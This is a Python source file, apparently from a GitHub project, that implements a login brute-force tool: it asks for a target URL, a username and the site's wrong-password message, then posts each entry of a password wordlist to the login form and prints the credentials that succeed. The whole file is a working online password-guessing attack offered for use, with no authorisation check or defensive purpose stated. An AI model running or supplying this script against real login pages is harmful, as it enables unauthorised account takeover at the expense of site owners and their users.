######################################################################################################
# Title: Brute force                                                                                 #
# Author: Tanvir Hossain Antu                                                                        #
# Github : https://github.com/Antu7                                                                 #
# If you use the code give me the credit please                                                      #
######################################################################################################

print (""" 

██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            

                   Tanvir Hossain Antu
        https://github.com/Antu7/python-bruteForce


""")

import threading
import requests
import time
import sys

class BruteForceCracker:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message
        
        # Afficher le message d'initialisation
        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(0.02)

    def crack(self, password):
        data_dict = {
            "username": self.username,  # Correspond au champ dans le HTML
            "password": password  # Correspond au champ dans le HTML
        }
        response = requests.post(self.url, data=data_dict)
        
        
        if self.error_message in str(response.content):
            return False
        else:
            print("Username: ---> " + self.username)
            print("Password: ---> " + password)
            return True

def crack_passwords(passwords, cracker):
    for count, password in enumerate(passwords, start=1):
        password = password.strip()
        print("Trying Password: {} Time For => {}".format(count, password))
        if cracker.crack(password):
            break  # Arrêter si le mot de passe est trouvé

def main():
    url = input("Enter Target Url: ")
    username = input("Enter Target Username: ")
    error = input("Enter Wrong Password Error Message: ")
    cracker = BruteForceCracker(url, username, error)
    
    with open("500word.txt", "r") as f:
        passwords = f.readlines()  # Lire tous les mots de passe en une fois
        t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
        t.start()
        t.join()  # Attendre que le thread se termine avant de continuer

if __name__ == '__main__':
    banner = """ 
                       Checking the Server !!        
        [+]█████████████████████████████████████████████████[+]
"""
    print(banner)
    main()